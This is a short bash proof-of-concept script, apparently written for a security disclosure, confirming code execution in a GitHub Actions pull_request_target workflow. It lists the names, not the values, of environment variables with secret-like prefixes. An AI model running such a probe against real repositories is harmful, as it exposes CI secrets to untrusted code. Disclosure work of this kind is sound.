#!/bin/bash
echo "[PoC] pull_request_target code execution confirmed"
echo "[PoC] Checking presence of secrets (names only)"
env | cut -d= -f1 | grep -E 'RTLIC|JF_|GITHUB_' || true
echo "[PoC] No secret values printed"
